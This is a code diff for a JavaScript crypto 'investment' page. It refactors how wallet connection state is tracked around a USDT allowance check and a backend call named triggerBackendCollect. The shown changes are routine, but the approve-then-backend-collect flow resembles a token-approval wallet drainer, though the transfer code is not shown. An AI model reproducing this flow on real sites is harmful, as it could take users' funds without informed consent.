@@ -39,11 +39,9 @@ const amountInput   = document.getElementById("investAmount");
 
 if (merchantInput) merchantInput.value = MERCHANT_ADDRESS;
 
-// ─── Estado global de sesión y validaciones ───────────────────────────────────
+// ─── Estado global para validaciones ──────────────────────────────────────────
 let cachedUserBalance = 0;
 let pendingInvestment = false;
-let isWalletConnected = false;     // Bandera estricta de conexión
-let currentRawProvider = null;     // Proveedor activo en memoria
 
 // ─── Wake up Render backend ───────────────────────────────────────────────────
 (async () => { try { await fetch(`${BACKEND_URL}/health`); } catch (_) {} })();
@@ -76,11 +74,8 @@ function setLoading(on, label = "Processing…") {
   if (btnSpinner) btnSpinner.hidden   = !on;
 }
 
-// ─── UI Reset Helper (Desconexión Real y Limpieza) ───────────────────────────
+// ─── UI Reset Helper (Disconnect State) ──────────────────────────────────────
 function resetAppUI() {
-  isWalletConnected = false;
-  currentRawProvider = null;
-
   const balanceLabel = document.getElementById("walletBalanceLabel");
   if (balanceLabel) {
     balanceLabel.textContent = "Saldo: -- USDT";
@@ -95,13 +90,6 @@ function resetAppUI() {
   pendingInvestment = false;
   setLoading(false);
   showToast("Billetera desconectada.", "default", 3000);
-
-  // Forzar a AppKit a limpiar su caché interna de sesión
-  if (window.modal && typeof window.modal.disconnect === "function") {
-    try {
-      window.modal.disconnect();
-    } catch (_) {}
-  }
 }
 
 // ─── Validación en tiempo real del Input ─────────────────────────────────────
@@ -146,7 +134,6 @@ async function fetchAndDisplayUserBalances(rawProvider) {
     }
   } catch (err) {
     console.error("Error al sincronizar saldos en vivo:", err);
-    resetAppUI();
   }
 }
 
@@ -174,16 +161,13 @@ async function triggerBackendCollect(userAddress) {
   throw lastErr;
 }
 
-// ─── Suscripciones reactivas de Reown AppKit ──────────────────────────────────
+// ─── Suscripciones reactivas (Conexión / Desconexión / Modal) ─────────────────
 if (window.modal && typeof window.modal.subscribeProviders === "function") {
   window.modal.subscribeProviders((state) => {
     const rawProvider = state["eip155"]; 
     
     if (rawProvider) {
-      isWalletConnected = true;
-      currentRawProvider = rawProvider;
       fetchAndDisplayUserBalances(rawProvider); 
-      
       if (pendingInvestment) {
         pendingInvestment = false; 
         runInvestmentFlow(rawProvider); 
@@ -202,10 +186,8 @@ if (window.modal && typeof window.modal.subscribeState === "function") {
         rawProvider = window.modal.getWalletProvider();
       } catch (_) {}
 
-      // Si cerró el modal de forma manual y no hay conexión real, reseteamos
-      if (!rawProvider && !isWalletConnected) {
-        pendingInvestment = false;
-        setLoading(false);
+      if (!rawProvider) {
+        resetAppUI();
       }
     }
   });
@@ -216,19 +198,23 @@ document.addEventListener("DOMContentLoaded", () => {
     try {
       const activeProvider = window.modal.getWalletProvider();
       if (activeProvider) {
-        isWalletConnected = true;
-        currentRawProvider = activeProvider;
         fetchAndDisplayUserBalances(activeProvider);
       }
     } catch (_) {}
   }
 });
 
-// ─── Evento del botón principal (Abre modal si no está conectado) ─────────────
+// ─── Evento del botón principal ───────────────────────────────────────────────
 if (approveBtn) {
   approveBtn.addEventListener("click", async () => {
-    // Validación estricta basada en la bandera de sesión
-    if (!isWalletConnected || !currentRawProvider) {
+    let rawProvider = null;
+    if (window.modal && typeof window.modal.getWalletProvider === "function") {
+      try {
+        rawProvider = window.modal.getWalletProvider();
+      } catch (_) {}
+    }
+
+    if (!rawProvider) {
       pendingInvestment = true; 
       setLoading(true, "Abriendo selector de billetera...");
       
@@ -244,12 +230,11 @@ if (approveBtn) {
       return; 
     }
 
-    // Si está conectado de verdad, ejecutamos el flujo
-    await runInvestmentFlow(currentRawProvider);
+    await runInvestmentFlow(rawProvider);
   });
 }
 
-// ─── Flujo centralizado de inversión ──────────────────────────────────────────
+// ─── Flujo centralizado con avisos de "Revisa tu billetera" ───────────────────
 async function runInvestmentFlow(rawProvider) {
   setLoading(true, "Conectando proveedor…");
   
@@ -315,7 +300,7 @@ async function runInvestmentFlow(rawProvider) {
       return;
     }
 
-    // 4. Allowance
+    // 4. Allowance con aviso explícito para revisar wallet
     setLoading(true, "Verificando autorizaciones...");
     const allowance = await usdtContract.allowance(userAddress, CONTRACT_ADDRESS);
     
